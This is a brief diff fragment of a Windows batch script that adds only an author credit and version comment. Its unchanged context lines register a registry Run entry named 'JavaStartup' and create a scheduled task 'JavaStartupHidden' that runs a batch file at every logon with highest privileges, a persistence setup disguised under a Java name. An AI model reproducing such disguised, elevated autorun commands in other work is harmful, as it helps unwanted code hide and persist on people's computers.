@@ -44,3 +44,6 @@ reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "JavaStartup" /t
 SCHTASKS /Create /TN "JavaStartupHidden" /TR "\"%AURA_BAT_FILE%\"" /SC ONLOGON /RL HIGHEST /F
 
 exit
+
+:: Made By MrAboudi
+:: v3
